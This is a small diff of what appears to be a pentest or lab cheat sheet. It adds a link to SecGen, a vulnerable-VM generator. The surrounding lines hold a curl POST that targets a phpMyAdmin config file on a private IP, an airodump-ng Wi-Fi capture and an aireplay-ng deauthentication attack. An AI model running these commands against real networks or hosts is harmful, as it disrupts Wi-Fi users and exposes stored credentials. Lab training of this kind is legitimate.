@@ -49,3 +49,5 @@ curl -X POST -F "file=./phpmy/config.inc.php" http://192.168.118.196/test.php
 airodump-ng -c 3 --bssid MAC -w ~/dir/ wlan0mon
 
 aireplay-ng -0 25 -a MAC wlan0mon
+
+https://github.com/cliffe/SecGen
